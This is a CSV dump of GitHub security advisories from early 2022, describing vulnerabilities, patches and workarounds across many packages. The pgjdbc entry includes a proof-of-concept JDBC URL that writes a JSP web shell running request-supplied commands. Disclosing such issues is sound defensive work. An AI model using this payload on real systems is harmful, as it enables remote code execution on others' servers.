2302,38798,com.netflix.conductor:conductor-core,GHSA-wfj5-2mqr-7jvv,CVE-2020-9296,https://github.com/advisories/GHSA-wfj5-2mqr-7jvv,critical,2022-02-10 23:06:57 UTC,Expression Language Injection in Netflix Conductor,"Netflix Conductor uses Java Bean Validation (JSR 380) custom constraint validators. When building custom constraint violation error messages, different types of interpolation are supported, including Java EL expressions. If an attacker can inject arbitrary data in the error message template being passed to ConstraintValidatorContext.buildConstraintViolationWithTemplate() argument, they will be able to run arbitrary Java code.",maven
2303,16186,ajv,GHSA-v88g-cgmw-v5xw,CVE-2020-15366,https://github.com/advisories/GHSA-v88g-cgmw-v5xw,moderate,2022-02-10 23:30:59 UTC,Prototype Pollution in Ajv,"An issue was discovered in ajv.validate() in Ajv (aka Another JSON Schema Validator) 6.12.2. A carefully crafted JSON schema could be provided that allows execution of other code by prototype pollution. (While untrusted schemas are recommended against, the worst case of an untrusted schema should be a denial of service, not execution of code.)",npm
2304,17380,bson,GHSA-4jwp-vfvf-657p,CVE-2019-2391,https://github.com/advisories/GHSA-4jwp-vfvf-657p,moderate,2022-02-10 23:30:20 UTC,Deserialization of Untrusted Data in bson,Incorrect parsing of certain JSON input may result in js-bson not correctly serializing BSON. This may cause unexpected application behaviour including data disclosure.,npm
2305,16013,handlebars,GHSA-3cqr-58rm-57f8,CVE-2019-20920,https://github.com/advisories/GHSA-3cqr-58rm-57f8,high,2022-02-10 20:38:19 UTC,Arbitrary Code Execution in Handlebars,"Handlebars before 3.0.8 and 4.x before 4.5.3 is vulnerable to Arbitrary Code Execution. The lookup helper fails to properly validate templates, allowing attackers to submit templates that execute arbitrary JavaScript. This can be used to run arbitrary code on a server processing Handlebars templates or in a victim's browser (effectively serving as XSS).",npm
2306,16013,handlebars,GHSA-62gr-4qp9-h98f,CVE-2019-20922,https://github.com/advisories/GHSA-62gr-4qp9-h98f,high,2022-02-10 20:38:22 UTC,Regular Expression Denial of Service in Handlebars,Handlebars before 4.4.5 allows Regular Expression Denial of Service (ReDoS) because of eager matching. The parser may be forced into an endless loop while processing crafted templates. This may allow attackers to exhaust system resources.,npm
2307,34929,org.apache.tapestry:tapestry-core,GHSA-w9mp-p2wp-2xf7,CVE-2020-13953,https://github.com/advisories/GHSA-w9mp-p2wp-2xf7,moderate,2022-02-10 20:35:42 UTC,Improper file downloads in Apache Tapestry,"In Apache Tapestry from 5.4.0 to 5.5.0, crafting specific URLs, an attacker can download files inside the WEB-INF folder of the WAR being run.",maven
2308,34809,io.vertx:vertx-web,GHSA-vjw7-6gfq-6wf5,CVE-2019-17640,https://github.com/advisories/GHSA-vjw7-6gfq-6wf5,critical,2022-02-10 20:28:57 UTC,Path Traversal in Eclipse Vert,"In Eclipse Vert.x 3.4.x up to 3.9.4, 4.0.0-milestone1, 4.0.0-milestone2, 4.0.0-milestone3, 4.0.0-milestone4, 4.0.0-milestone5, 4.0.0.Beta1, 4.0.0.Beta2, and 4.0.0.Beta3, StaticHandler doesn't correctly processes back slashes on Windows Operating systems, allowing, escape the webroot folder to the current working directory.",maven
2309,22243,kubernetes,GHSA-qh36-44jv-c8xj,CVE-2020-8562,https://github.com/advisories/GHSA-qh36-44jv-c8xj,low,2022-02-02 00:01:58 UTC,Potential proxy IP restriction bypass in Kubernetes,"As mitigations to a report from 2019 and CVE-2020-8555, Kubernetes attempts to prevent proxied connections from accessing link-local or localhost networks when making user-driven connections to Services, Pods, Nodes, or StorageClass service providers. As part of this mitigation Kubernetes does a DNS name resolution check and validates that response IPs are not in the link-local (169.254.0.0/16) or localhost (127.0.0.0/8) range. Kubernetes then performs a second DNS resolution without validation for the actual connection. If a non-standard DNS server returns different non-cached responses, a user may be able to bypass the proxy IP restriction and access private networks on the control plane.",go
2310,22106,distribution,GHSA-qq97-vm5h-rrhg,,https://github.com/advisories/GHSA-qq97-vm5h-rrhg,low,2022-02-08 18:53:56 UTC,OCI Manifest Type Confusion Issue,"### Impact

Systems that rely on digest equivalence for image attestations may be vulnerable to type confusion.

### Patches

Upgrade to at least `v2.8.0-beta.1`  if you are running `v2.x` release. If you use the code from the `main` branch, update at least to the commit after [b59a6f827947f9e0e67df0cfb571046de4733586](https://github.com/distribution/distribution/commit/b59a6f827947f9e0e67df0cfb571046de4733586).

### Workarounds

There is no way to work around this issue without patching.

### References

Due to [an oversight in the OCI Image Specification](https://github.com/opencontainers/image-spec/pull/411) that removed the embedded `mediaType` field from manifests, a maliciously crafted OCI Container Image can cause registry clients to parse the same image in two different ways without modifying the image’s digest by modifying the `Content-Type` header returned by a registry. This can invalidate a common pattern of relying on container image digests for equivalence.

### For more information

If you have any questions or comments about this advisory:
* Open an issue in [distribution](https://github.com/distribution/distribution) 
* Open an issue in [distribution-spec](https://github.com/opencontainers/distribution-spec) 
* Email us at [cncf-distribution-security@lists.cncf.io](mailto:cncf-distribution-security@lists.cncf.io)
",go
2311,18987,puma,GHSA-rmj8-8hhh-gv5h,CVE-2022-23634,https://github.com/advisories/GHSA-rmj8-8hhh-gv5h,high,2022-02-11 21:33:23 UTC,Puma used with Rails may lead to Information Exposure,"### Impact
Prior to `puma` version `5.6.2`, `puma` may not always call `close` on the response body. Rails, prior to version `7.0.2.2`, depended on the response body being closed in order for its `CurrentAttributes` implementation to work correctly.

From Rails:

> Under certain circumstances response bodies will not be closed, for example a bug in a webserver[1] or a bug in a Rack middleware. In the event a response is not notified of a close, ActionDispatch::Executor will not know to reset thread local state for the next request. This can lead to data being leaked to subsequent requests, especially when interacting with ActiveSupport::CurrentAttributes.

The combination of these two behaviors (Puma not closing the body + Rails' Executor implementation) causes information leakage.

### Patches
This problem is fixed in Puma versions 5.6.2 and 4.3.11.

This problem is fixed in Rails versions 7.02.2, 6.1.4.6, 6.0.4.6, and 5.2.6.2.

See: 
https://github.com/advisories/GHSA-wh98-p28r-vrc9 
for details about the rails vulnerability

Upgrading to a patched Rails _or_ Puma version fixes the vulnerability.

### Workarounds

Upgrade to Rails versions 7.02.2, 6.1.4.6, 6.0.4.6, and 5.2.6.2.

The [Rails CVE](https://groups.google.com/g/ruby-security-ann/c/FkTM-_7zSNA/m/K2RiMJBlBAAJ?utm_medium=email&utm_source=footer&pli=1) includes a middleware that can be used instead.

### References

* Rails CVE: [CVE-2022-23633](https://groups.google.com/g/ruby-security-ann/c/FkTM-_7zSNA/m/K2RiMJBlBAAJ?utm_medium=email&utm_source=footer&pli=1)

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [puma](https://github.com/puma/puma)
* See our [security policy](https://github.com/puma/puma/security/policy)",rubygems
2312,17687,follow-redirects,GHSA-pw2r-vq6v-hr8c,CVE-2022-0536,https://github.com/advisories/GHSA-pw2r-vq6v-hr8c,moderate,2022-02-10 00:00:31 UTC,Exposure of Sensitive Information to an Unauthorized Actor in follow-redirects,Exposure of Sensitive Information to an Unauthorized Actor in NPM follow-redirects prior to 1.14.8.,npm
2313,18865,actionpack,GHSA-wh98-p28r-vrc9,CVE-2022-23633,https://github.com/advisories/GHSA-wh98-p28r-vrc9,high,2022-02-11 20:49:14 UTC,Exposure of information in Action Pack,"### Impact

Under certain circumstances response bodies will not be closed, for example a [bug in a webserver](https://github.com/puma/puma/pull/2812) or a bug in a Rack middleware.  In the event a response is *not* notified of a `close`, `ActionDispatch::Executor` will not know to reset thread local state for the next request.  This can lead to data being leaked to subsequent requests, especially when interacting with `ActiveSupport::CurrentAttributes`.

Upgrading to the FIXED versions of Rails will ensure mitigation of this issue even in the context of a buggy webserver or middleware implementation.

### Patches

This has been fixed in Rails 7.0.2.2, 6.1.4.6, 6.0.4.6, and 5.2.6.2.

### Workarounds

Upgrading is highly recommended, but to work around this problem the following middleware can be used:

```ruby
class GuardedExecutor < ActionDispatch::Executor
  def call(env)
    ensure_completed!
    super
  end

  private

    def ensure_completed!
      @executor.new.complete! if @executor.active?
    end
end

# Ensure the guard is inserted before ActionDispatch::Executor
Rails.application.configure do
  config.middleware.swap ActionDispatch::Executor, GuardedExecutor, executor
end
```",rubygems
2314,30904,opa,GHSA-hcw3-j74m-qc58,CVE-2022-23628,https://github.com/advisories/GHSA-hcw3-j74m-qc58,moderate,2022-02-09 22:17:37 UTC,Incorrect Calculation in github.com/open-policy-agent/opa,"### Impact

Under certain conditions, pretty-printing an AST that contains synthetic nodes could change the logic of some statements by reordering array literals. Example of policies impacted are those that parse and compare web paths, see the example below.

**All of these** three conditions have to be met to create an adverse effect:

1. An AST of Rego had to be **created programmatically** such that it ends up containing terms without a location (such as wildcard variables).
2. The AST had to be **pretty-printed** using the `github.com/open-policy-agent/opa/format` package.
3. The result of the pretty-printing had to be **parsed and evaluated again** via an OPA instance using the bundles, or the Golang packages.

If any of these three conditions are not met, you are not affected.

Notably, all three would be true if using **optimized bundles**, i.e. bundles created with `opa build -O=1` or higher.
In that case, the optimizer would fulfil condition (1.), the result of that would be pretty-printed when writing the bundle to disk, fulfilling (2.). When the bundle was then used, we'd satisfy (3.).

#### Example
For example, the process outlined above could turn 
this rule
```rego
hello {
	[""foo"", _] = split(input.resource, ""/"")
}
```

into
```rego
hello {
	[_, ""foo""] = split(input.resource, ""/"")
}
```

with an input of
```rego
{
    ""resource"": ""foo/bar""
}
```

the result would change from
```rego
{
    ""hello"": true
}
```
to (no default value of hello)
```rego
{}
```

The severity was determined to be *moderate* because the conditions are quite particular. Please note that its only the OPA bundle build process thats affected. An OPA sidecar of version 0.36.0 with an optimized bundle built by OPA 0.32.1 would not face this bug.

### Patches

Fixed in version 0.37.2.

### Workarounds

- Disabling optimization when creating bundles.

### References

- Introduced in https://github.com/open-policy-agent/opa/pull/3851
- Backported for the 0.33.1 patch release: https://github.com/open-policy-agent/opa/commit/bfd984ddf93ef2c4963a08d4fdadae0bcf1a3717
- Fixed by https://github.com/open-policy-agent/opa/commit/932e4ffc37a590ace79e9b75ca4340288c220239 and https://github.com/open-policy-agent/opa/commit/2bd8edab9e10e2dc9cf76ae8335ced0c224f3055

### For more information

If you have any questions or comments about this advisory:

* Open an issue in [Community Discussions](https://github.com/open-policy-agent/community/discussions/categories/opa-and-rego)
* Ask in Slack: https://slack.openpolicyagent.org/",go
2315,33120,nats-streaming-server,GHSA-g6w6-r76c-28j7,CVE-2022-24450,https://github.com/advisories/GHSA-g6w6-r76c-28j7,critical,2022-02-08 17:23:16 UTC,Incorrect Authorization in NATS nats-server,"(This advisory is canonically <https://advisories.nats.io/CVE/CVE-2022-24450.txt>)

## Problem Description

NATS nats-server through 2022-02-04 has Incorrect Access Control, with unchecked ability for clients to authorize into any account, because of a coding error in a long-extant experimental feature.

A client crafting the initial protocol-level handshake could, with valid credentials for any account, specify a target account and switch into it immediately.  This includes any other tenant, and includes the System account which controls nats-server core operations.

For deployments not using multi-tenancy through NATS Accounts, there is still a vulnerability: normal users are able to choose to be in the System account.

An experimental feature to provide dynamically provisioned sandbox accounts was designed to allow a server administrator to turn on an option to allow clients to dynamically request a brand new account inline at connection time.  This feature went nowhere, but lived on in the code and was used by a number of tests; support was never added to any client libraries or to the documentation.

A bug in handling the feature meant that if someone did in fact have valid account credentials, then they could specify any other existing account and they would be assigned into that account.

Release 2.7.2 of nats-server removes the feature.
Because of the lack of client support and absence from protocol documentation, we feel this is safe operationally as well as the safest fix for the code.


## Affected versions

#### NATS Server
 * All 2.x versions up to and including 2.7.1.
 * Fixed with nats-io/nats-server: 2.7.2
 * NATS Server 1.x did not have accounts.
 * Docker image:  nats <https://hub.docker.com/_/nats>

#### NATS Streaming Server
 * All versions embedding affected NATS Server:
   + Affected: v0.15.0 up to and including v0.24.0
   + Fixed with nats-io/nats-streaming-server: 0.24.1
 * Docker image:  nats-streaming <https://hub.docker.com/_/nats-streaming>


## Impact

Existing users could act in any account, including the System account.

## Workaround

None.

## Solution

Upgrade the NATS server.",go
2316,23183,containerd,GHSA-742w-89gc-8m9c,CVE-2020-15157,https://github.com/advisories/GHSA-742w-89gc-8m9c,moderate,2022-02-11 23:27:39 UTC,containerd v1.2.x can be coerced into leaking credentials during image pull,"## Impact

If a container image manifest in the OCI Image format or Docker Image V2 Schema 2 format includes a URL for the location of a specific image layer (otherwise known as a “foreign layer”), the default containerd resolver will follow that URL to attempt to download it. In v1.2.x but not 1.3.0 or later, the default containerd resolver will provide its authentication credentials if the server where the URL is located presents an HTTP 401 status code along with registry-specific HTTP headers.

If an attacker publishes a public image with a manifest that directs one of the layers to be fetched from a web server they control and they trick a user or system into pulling the image, they can obtain the credentials used for pulling that image. In some cases, this may be the user's username and password for the registry. In other cases, this may be the credentials attached to the cloud virtual instance which can grant access to other cloud resources in the account.

The default containerd resolver is used by the cri-containerd plugin (which can be used by Kubernetes), the ctr development tool, and other client programs that have explicitly linked against it.

This vulnerability has been rated by the containerd maintainers as medium, with a CVSS score of 6.1 and a vector string of CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:N/A:N.

## Patches

This vulnerability has been fixed in containerd 1.2.14.  containerd 1.3 and later are not affected.

## Workarounds

If you are using containerd 1.3 or later, you are not affected.  If you are using cri-containerd in the 1.2 series or prior, you should ensure you only pull images from trusted sources.  Other container runtimes built on top of containerd but not using the default resolver (such as Docker) are not affected.

## Credits

The containerd maintainers would like to thank Brad Geesaman, Josh Larsen, Ian Coldwater, Duffie Cooley, and Rory McCune for responsibly disclosing this issue in accordance with the [containerd security policy](https://github.com/containerd/project/blob/master/SECURITY.md).",go
2317,39599,org.apache.cayenne:cayenne-server,GHSA-c58c-w527-h77p,CVE-2022-24289,https://github.com/advisories/GHSA-c58c-w527-h77p,high,2022-02-12 00:00:48 UTC,Deserialization of untrusted data in Apache Cayenne,"Hessian serialization is a network protocol that supports object-based transmission. Apache Cayenne's optional Remote Object Persistence (ROP) feature is a web services-based technology that provides object persistence and query functionality to 'remote' applications. In Apache Cayenne 4.1 and earlier, running on non-current patch versions of Java, an attacker with client access to Cayenne ROP can transmit a malicious payload to any vulnerable third-party dependency on the server. This can result in arbitrary code execution.",maven
2318,22126,docker,GHSA-wxj3-qwv4-cvfm,CVE-2014-3499,https://github.com/advisories/GHSA-wxj3-qwv4-cvfm,high,2022-02-15 00:40:44 UTC,Privilege Escalation in Docker,"Docker 1.0.0 uses world-readable and world-writable permissions on the management socket, which allows local users to gain privileges via unspecified vectors.",go
2319,22126,docker,GHSA-5qgp-p5jc-w2rm,CVE-2014-6407,https://github.com/advisories/GHSA-5qgp-p5jc-w2rm,high,2022-02-15 00:41:12 UTC,Arbitrary Code Execution in Docker,Docker before 1.3.2 allows remote attackers to write to arbitrary files and execute arbitrary code via a (1) symlink or (2) hard link attack in an image archive in a (a) pull or (b) load operation.,go
2320,22126,docker,GHSA-qmmc-jppf-32wv,CVE-2014-9358,https://github.com/advisories/GHSA-qmmc-jppf-32wv,moderate,2022-02-15 00:41:14 UTC,Directory Traversal in Docker,"Docker before 1.3.3 does not properly validate image IDs, which allows remote attackers to conduct path traversal attacks and spoof repositories via a crafted image in a (1) ""docker load"" operation or (2) ""registry communications.""",go
2321,22126,docker,GHSA-g7v2-2qxx-wjrw,CVE-2015-3627,https://github.com/advisories/GHSA-g7v2-2qxx-wjrw,moderate,2022-02-15 01:18:02 UTC,Symlink Attack in Libcontainer and Docker Engine,"Libcontainer and Docker Engine before 1.6.1 opens the file-descriptor passed to the pid-1 process before performing the chroot, which allows local users to gain privileges via a symlink attack in an image.",go
2322,34022,org.postgresql:postgresql,GHSA-673j-qm5f-xpv8,,https://github.com/advisories/GHSA-673j-qm5f-xpv8,moderate,2022-02-16 00:08:18 UTC,pgjdbc Arbitrary File Write Vulnerability,"### Overview
The connection properties for configuring a pgjdbc connection are not meant to be exposed to an unauthenticated attacker. While allowing an attacker to specify arbitrary connection properties could lead to a compromise of a system, that's a defect of an application that allows unauthenticated attackers that level of control.

It's not the job of the pgjdbc driver to decide whether a given log file location is acceptable. End user applications that use the pgjdbc driver must ensure that filenames are valid and restrict unauthenticated attackers from being able to supply arbitrary values. That's not specific to the pgjdbc driver either, it would be true for any library that can write to the application's local file system.

While we do not consider this a security issue with the driver, we have decided to remove the loggerFile and loggerLevel connection properties in the next release of the driver. Removal of those properties does not make exposing the JDBC URL or connection properties to an attacker safe and we continue to suggest that applications do not allow untrusted users to specify arbitrary connection properties. We are removing them to prevent misuse and their functionality can be delegated to java.util.logging.

If you identify an application that allows remote users to specify a complete JDBC URL or properties without validating it's contents, we encourage you to notify the application owner as that may be a security defect in that specific application.

### Impact
It is possible to specify an arbitrary filename in the loggerFileName connection parameter
""jdbc:postgresql://localhost:5432/test?user=test&password=test&loggerLevel=DEBUG&loggerFile=./blah.jsp&<%Runtime.getRuntime().exec(request.getParameter(\""i\""));%>""

This creates a valid JSP file which could lead to a Remote Code Execution 

### Patches
A [patch](https://github.com/pgjdbc/pgjdbc/commit/f6d47034a4ce292e1a659fa00963f6f713117064) exists for version 42.3.3.

### Workarounds
sanitize the inputs to the driver

Reported by Allan Lou v3ged0ge@gmail.com",maven
2323,16863,next,GHSA-fmvm-x8mv-47mj,CVE-2022-23646,https://github.com/advisories/GHSA-fmvm-x8mv-47mj,moderate,2022-02-17 17:19:18 UTC,Improper CSP in Image Optimization API for Next.js versions between 10.0.0 and 12.1.0,"Next.js is a React framework. Starting with version 10.0.0 and prior to version 12.1.0, Next.js is vulnerable to User Interface (UI) Misrepresentation of Critical Information. In order to be affected, the `next.config.js` file must have an `images.domains` array assigned and the image host assigned in `images.domains` must allow user-provided SVG. If the `next.config.js` file has `images.loader` assigned to something other than default, the instance is not affected. Version 12.1.0 contains a patch for this issue. As a workaround, change `next.config.js` to use a different `loader configuration` other than the default.

### Impact
- **Affected**: All of the following must be true to be affected
  - Next.js between version 10.0.0 and 12.0.10
  - The `next.config.js` file has [images.domains](https://nextjs.org/docs/api-reference/next/image#domains) array assigned
  - The image host assigned in [images.domains](https://nextjs.org/docs/api-reference/next/image#domains) allows user-provided SVG
- **Not affected**: The `next.config.js` file has [images.loader](https://nextjs.org/docs/api-reference/next/image#loader-configuration) assigned to something other than default

### Patches
[Next.js 12.1.0](https://github.com/vercel/next.js/releases/tag/v12.1.0)

### Workarounds
Change `next.config.js` to use a different [loader configuration](https://nextjs.org/docs/api-reference/next/image#loader-configuration) other than the default, for example:

```js
module.exports = {
  images: {
    loader: 'imgix',
    path: 'https://example.com/myaccount/',
  },
}
```

Or if you want to use the [`loader`](https://nextjs.org/docs/api-reference/next/image#loader) prop on the component, you can use `custom`:
```js
module.exports = {
  images: {
    loader: 'custom',
  },
}
```

",npm
2324,20197,sanic,GHSA-7p79-6x2v-5h88,,https://github.com/advisories/GHSA-7p79-6x2v-5h88,high,2022-02-16 22:57:57 UTC,Server crash if running Python 3.10 w/ Sanic 20.12,"**!!! ONLY APPLIES TO VERSIONS PRIOR TO Sanic v20.12 WHEN USING Python 3.10 !!!**

Sanic v20.12 officially supports Python versions 3.6, 3.7, 3.8, and 3.9. However, if you accidentally run it with version 3.10 (**which is not supported by Sanic 20.12**), your server is prone to crashing on an incoming web request.

### Impact
Anyone running Sanic server between 0.1.7 and 20.12 **using Python 3.10**.

### Patches
[Sanic v20.12.6](https://github.com/sanic-org/sanic/releases/tag/v20.12.6)

### Workarounds
Use a supported version of Python (v3.6 - v3.9)

### References
> In [asyncio](https://docs.python.org/3/library/asyncio.html#module-asyncio), the explicit passing of a loop argument has been deprecated and will be removed in version 3.10 for the following: ... [asyncio.Event](https://docs.python.org/3/library/asyncio-sync.html#asyncio.Event)

[Python 3.8 Release Notes](https://docs.python.org/3/whatsnew/3.8.html#deprecated)

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [the community forums](https://community.sanicframework.org/)
* Ping us on [the Discord server](https://discord.gg/FARQzAEMAA)
",pip
2325,16942,url-parse,GHSA-rqff-837h-mm52,CVE-2022-0512,https://github.com/advisories/GHSA-rqff-837h-mm52,moderate,2022-02-15 00:02:46 UTC,Authorization bypass in url-parse,Authorization Bypass Through User-Controlled Key in NPM url-parse prior to 1.5.6.,npm
2326,22537,promhttp,GHSA-cg3q-j54f-5p7p,CVE-2022-21698,https://github.com/advisories/GHSA-cg3q-j54f-5p7p,high,2022-02-16 22:26:35 UTC,Uncontrolled Resource Consumption in promhttp,"This is the Go client library for Prometheus. It has two separate parts, one for instrumenting application code, and one for creating clients that talk to the Prometheus HTTP API. client_golang is the instrumentation library for Go applications in Prometheus, and the promhttp package in client_golang provides tooling around HTTP servers and clients.

### Impact

HTTP server susceptible to a Denial of Service through unbounded cardinality, and potential memory exhaustion, when handling requests with non-standard HTTP methods.

###  Affected Configuration

In order to be affected, an instrumented software must

* Use any of `promhttp.InstrumentHandler*` middleware except `RequestsInFlight`.
* Do not filter any specific methods (e.g GET) before middleware.
* Pass metric with `method` label name to our middleware.
* Not have any firewall/LB/proxy that filters away requests with unknown `method`.

### Patches

* https://github.com/prometheus/client_golang/pull/962
* https://github.com/prometheus/client_golang/pull/987

### Workarounds

If you cannot upgrade to [v1.11.1 or above](https://github.com/prometheus/client_golang/releases/tag/v1.11.1), in order to stop being affected you can:

* Remove `method` label name from counter/gauge you use in the InstrumentHandler.
* Turn off affected promhttp handlers.
* Add custom middleware before promhttp handler that will sanitize the request method given by Go http.Request.
* Use a reverse proxy or web application firewall, configured to only allow a limited set of methods.

### For more information

If you have any questions or comments about this advisory:

* Open an issue in https://github.com/prometheus/client_golang
* Email us at `prometheus-team@googlegroups.com`
",go
2327,35136,net.lingala.zip4j:zip4j,GHSA-q62h-jw38-24vh,CVE-2022-24615,https://github.com/advisories/GHSA-q62h-jw38-24vh,moderate,2022-02-25 00:01:04 UTC,Uncaught Exception in zip4j,"zip4j up to 2.9.1 can throw various uncaught exceptions while parsing a specially crafted ZIP file, which could result in an application crash. This could be used to mount a denial of service attack against services that use zip4j library.",maven
2328,35054,edu.stanford.nlp:stanford-corenlp,GHSA-x2p8-rgfm-qw3v,CVE-2021-44550,https://github.com/advisories/GHSA-x2p8-rgfm-qw3v,critical,2022-02-25 00:01:07 UTC,Access Control vulnerability within CoreNLP,An Incorrect Access Control vulnerability exists in CoreNLP 4.3.2 via the classifier in NERServlet.java (lines 158 and 159).,maven
2329,29549,mlflow,GHSA-vqj2-4v8m-8vrq,CVE-2022-0736,https://github.com/advisories/GHSA-vqj2-4v8m-8vrq,high,2022-02-24 00:00:54 UTC,Insecure Temporary File in mlflow,mlflow prior to 1.23.1 contains an insecure temporary file. The insecure function `tempfile.mktemp()` is deprecated and `mkstemp()` should be used instead.,pip
2330,18823,nokogiri,GHSA-fq42-c5rg-92c2,,https://github.com/advisories/GHSA-fq42-c5rg-92c2,high,2022-02-25 20:32:09 UTC,Vulnerable dependencies in Nokogiri,"### Summary

Nokogiri [v1.13.2](https://github.com/sparklemotion/nokogiri/releases/tag/v1.13.2) upgrades two of its packaged dependencies:

- vendored libxml2 from v2.9.12 to [v2.9.13](https://download.gnome.org/sources/libxml2/2.9/libxml2-2.9.13.news)
- vendored libxslt from v1.1.34 to [v1.1.35](https://download.gnome.org/sources/libxslt/1.1/libxslt-1.1.35.news)

Those library versions address the following upstream CVEs:

- libxslt: [CVE-2021-30560](https://nvd.nist.gov/vuln/detail/CVE-2021-30560) (CVSS 8.8, High severity)
- libxml2: [CVE-2022-23308](https://nvd.nist.gov/vuln/detail/CVE-2022-23308) (Unspecified severity, see more information below)

Those library versions also address numerous other issues including performance improvements, regression fixes, and bug fixes, as well as memory leaks and other use-after-free issues that were not assigned CVEs.

Please note that this advisory only applies to the CRuby implementation of Nokogiri `< 1.13.2`, and only if the _packaged_ libraries are being used. If you've overridden defaults at installation time to use _system_ libraries instead of packaged libraries, you should instead pay attention to your distro's `libxml2` and `libxslt` release announcements.


### Mitigation

Upgrade to Nokogiri `>= 1.13.2`.

Users who are unable to upgrade Nokogiri may also choose a more complicated mitigation: compile and link an older version Nokogiri against external libraries libxml2 `>= 2.9.13` and libxslt `>= 1.1.35`, which will also address these same CVEs.


### Impact

#### libxslt [CVE-2021-30560](https://nvd.nist.gov/vuln/detail/CVE-2021-30560)

- CVSS3 score: 8.8 (High)
- Fixed by https://gitlab.gnome.org/GNOME/libxslt/-/commit/50f9c9c

All versions of libxslt prior to v1.1.35 are affected.

Applications using **untrusted** XSL stylesheets to transform XML are vulnerable to a denial-of-service attack and should be upgraded immediately.


#### libxml2 [CVE-2022-23308](https://nvd.nist.gov/vuln/detail/CVE-2022-23308)

- As of the time this security advisory was published, there is no officially published information available about this CVE's severity. The above NIST link does not yet have a published record, and the libxml2 maintainer has declined to provide a severity score.
- Fixed by https://gitlab.gnome.org/GNOME/libxml2/-/commit/652dd12
- Further explanation is at https://mail.gnome.org/archives/xml/2022-February/msg00015.html

The upstream commit and the explanation linked above indicate that an application may be vulnerable to a denial of service, memory disclosure, or code execution if it parses an **untrusted** document with parse options `DTDVALID` set to true, and `NOENT` set to false.

An analysis of these parse options:

- While `NOENT` is off by default for Document, DocumentFragment, Reader, and Schema parsing, it is on by default for XSLT (stylesheet) parsing in Nokogiri v1.12.0 and later.
- `DTDVALID` is an option that Nokogiri does not set for any operations, and so this CVE applies only to applications setting this option explicitly.

It seems reasonable to assume that any application explicitly setting the parse option `DTDVALID` when parsing **untrusted** documents is vulnerable and should be upgraded immediately.
",rubygems
2331,16942,url-parse,GHSA-hgjh-723h-mx2j,CVE-2022-0686,https://github.com/advisories/GHSA-hgjh-723h-mx2j,critical,2022-02-21 00:00:21 UTC,Authorization Bypass Through User-Controlled Key in url-parse,url-parse prior to version 1.5.8 is vulnerable to Authorization Bypass Through User-Controlled Key.,npm
2332,34418,org.apache.cassandra:cassandra-all,GHSA-8ffc-79xg-29w8,CVE-2021-44521,https://github.com/advisories/GHSA-8ffc-79xg-29w8,critical,2022-02-12 00:00:48 UTC,Apache Cassandra vulnerable to Code Injection due to unsafe configuration,"When running Apache Cassandra with the following configuration: enable_user_defined_functions: true enable_scripted_user_defined_functions: true enable_user_defined_functions_threads: false it is possible for an attacker to execute arbitrary code on the host. The attacker would need to have enough permissions to create user defined functions in the cluster to be able to exploit this. Note that this configuration is documented as unsafe, and will continue to be considered unsafe after this CVE.",maven
2333,15538,CefSharp.WinForms,GHSA-vv6j-ww6x-54gx,CVE-2022-0609,https://github.com/advisories/GHSA-vv6j-ww6x-54gx,high,2022-02-22 21:51:19 UTC,Use after free in Animation,"CVE-2022-0609: Use after free in Animation

- https://chromereleases.googleblog.com/2022/02/stable-channel-update-for-desktop_14.html
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0609

Google is aware of reports that exploits for CVE-2022-0609 exist in the wild.

The exploitation is known to be easy. The attack may be initiated remotely. No form of authentication is needed for a successful exploitation. It demands that the victim is doing some kind of user interaction. Technical details are unknown but an exploit is available.

There is currently little other public information on the issue other than it has been flagged as `High` severity.",nuget
2334,14817,CefSharp.Common,GHSA-vv6j-ww6x-54gx,CVE-2022-0609,https://github.com/advisories/GHSA-vv6j-ww6x-54gx,high,2022-02-22 21:51:19 UTC,Use after free in Animation,"CVE-2022-0609: Use after free in Animation

- https://chromereleases.googleblog.com/2022/02/stable-channel-update-for-desktop_14.html
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0609

Google is aware of reports that exploits for CVE-2022-0609 exist in the wild.

The exploitation is known to be easy. The attack may be initiated remotely. No form of authentication is needed for a successful exploitation. It demands that the victim is doing some kind of user interaction. Technical details are unknown but an exploit is available.

There is currently little other public information on the issue other than it has been flagged as `High` severity.",nuget
2335,16351,prismjs,GHSA-3949-f494-cm99,CVE-2022-23647,https://github.com/advisories/GHSA-3949-f494-cm99,high,2022-02-22 19:32:18 UTC,Cross-site Scripting in Prism,"### Impact
Prism's [Command line plugin](https://prismjs.com/plugins/command-line/) can be used by attackers to achieve an XSS attack. The Command line plugin did not properly escape its output, leading to the input text being inserted into the DOM as HTML code.

Server-side usage of Prism is not impacted. Websites that do not use the Command Line plugin are also not impacted.

### Patches
This bug has been fixed in v1.27.0.

### Workarounds
Do not use the Command line plugin on untrusted inputs, or sanitized all code blocks (remove all HTML code text) from all code blocks that use the Command line plugin.

### References
- https://github.com/PrismJS/prism/pull/3341",npm
2336,16942,url-parse,GHSA-8v38-pw62-9cw2,CVE-2022-0639,https://github.com/advisories/GHSA-8v38-pw62-9cw2,moderate,2022-02-18 00:00:33 UTC,Incorrect returned href via an '@' sign but no user info and hostname,"A specially crafted URL with an '@' sign but empty user info and no hostname, when parsed with url-parse, url-parse will return the incorrect href. In particular,
`````
parse(\""http://@/127.0.0.1\"")
`````
Will return:
`````
{
 slashes: true,
 protocol: 'http:',
 hash: '',
 query: '',
 pathname: '/127.0.0.1',
 auth: '',
 host: '',
 port: '',
 hostname: '',
 password: '',
 username: '',
 origin: 'null',
 href: 'http:///127.0.0.1'
 }
`````
If the 'hostname' or 'origin' attributes of the output from url-parse are used in security decisions and the final 'href' attribute of the output is then used to make a request, the decision may be incorrect.
",npm
2337,22385,runc,GHSA-fgv8-vj5c-2ppq,CVE-2019-16884,https://github.com/advisories/GHSA-fgv8-vj5c-2ppq,high,2022-02-22 15:38:08 UTC,Incorrect Authorization in runc,"runc through 1.0.0-rc8, as used in Docker through 19.03.2-ce and other products, allows AppArmor restriction bypass because libcontainer/rootfs_linux.go incorrectly checks mount targets, and thus a malicious Docker image can mount over a /proc directory.",go
2338,17237,urijs,GHSA-gcv8-gh4r-25x6,CVE-2022-0613,https://github.com/advisories/GHSA-gcv8-gh4r-25x6,moderate,2022-02-17 00:00:35 UTC,Authorization Bypass Through User-Controlled Key in urijs,"Attacker can use case-insensitive protocol schemes like HTTP, htTP, HTtp etc. in order to bypass the patch for CVE-2021-3647.",npm
